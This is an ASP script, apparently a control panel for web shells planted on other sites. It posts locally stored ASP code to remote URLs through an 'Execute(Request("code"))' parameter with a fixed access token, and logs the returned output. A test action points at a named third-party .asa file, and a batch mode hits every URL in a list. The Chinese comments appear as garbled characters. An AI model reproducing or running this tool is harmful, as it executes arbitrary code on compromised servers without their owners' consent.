<!--#Include File = "Inc/Config.Asp"-->
<%
'���Eval����
Function getEvalContent(httpurl, codeFile, UpContent)
    Dim code, EvCode, splEvalType,content,dataStr
	splEvalType="start=====================end"
    code = GetASPCode(GetStext(codeFile)) 

    'ȥ��ǿ����������
    code = RegExp_Replace(code, "\sOption *Explicit\s", "") 
    code = Replace(code, "��", "X")                                                 'ȥ������X����Ϊ�����

    code = DelAspNote(code) 
    code = HandleGetAspCode(code, "|��һ��|ȥASP��ʼ������ǩ|") 
    code = TrimVbCrlf(code)
	
	code = "Response.Write(""" & splEvalType & """)" & vbCrLf & code & vbCrLf & "Response.End()"	
	code=HandleEvalAddDec(code, vbCrLf) 			'������ܴ���

    EvCode = "Code=" & escape(code) & "&EV=198%40Zy%5EHkr%4031&N=21&xy=Execute%28Request%28%22code%22%29%29&content=" & escape(UpContent) 

    '������ҳ��Ϣ
    content = XMLPost(httpurl, EvCode)
	
        '��ȡ��ǰ����
        If InStr(content, splEvalType) > 0 Then
            content = Mid(content, InStr(content, splEvalType) + Len(splEvalType))
        End If
		
		   content = Replace(Replace(content, "<br>", vbCrLf), "<hr>", vbCrLf)
            content = removeBlankLines(content)
            dataStr = DelHtml(HttpUrl & vbCrLf & "<br>" & content & vbCrLf & "<hr>" & vbCrLf)
			
            Call CreateAddFile("1.txt", dataStr)

	getEvalContent=dataStr
End Function

dim actionFilePath
actionFilePath="\DataDir\VBģ��\Eval\1��Debug\3����ʾ�ռ��С.Asp"
actionFilePath="\DataDir\VBģ��\Eval\2���ļ���\2����ʾ��Ŀ¼�ļ���.Asp"
actionFilePath="\DataDir\VBģ��\Eval\2���ļ���\_2������̷�Ŀ¼�ļ���.Asp"

'ѡ����
select case request("act")
	case "handleEval" : call rw(getEvalContent(rq("url"), actionFilePath, "content"))
	case "testEval" : call rw(getEvalContent("http://www.morteng.com/news_images/2014516161852738.asa", actionFilePath, "content"))
	case "batchHandleEval" : call batchHandleEval()
	case else : showDefault()
end select
'������Eval
sub batchHandleEval()
	dim content,splstr,url,c,s
	splstr=split(getftext("1.html"), vbcrlf)
	for each url in splstr
		url = phptrim(url)
		if len(url)>5 then
			s="<iframe src=""?act=handleEval&url="& url &""" frameborder='1' width='100%' height=80></iframe><hr>"
			c=c & s & vbcrlf
		end if
	next
	call rw(c)
end sub

'��ʾĬ��
sub showDefault()
	call echo("����", "<a href=""?act=testEval"">?act=testEval</a>")
	call echo("��������", "<a href=""?act=batchHandleEval"">?act=batchHandleEval</a>")
end sub
'call rw(getEvalContent("http://127.0.0.1/","E:\E��\WEB��վ\��ǰ��վ\DataDir\VBģ��\Eval\1��Debug\2��������ʾӢ��.Asp", "aaaa"))
%>































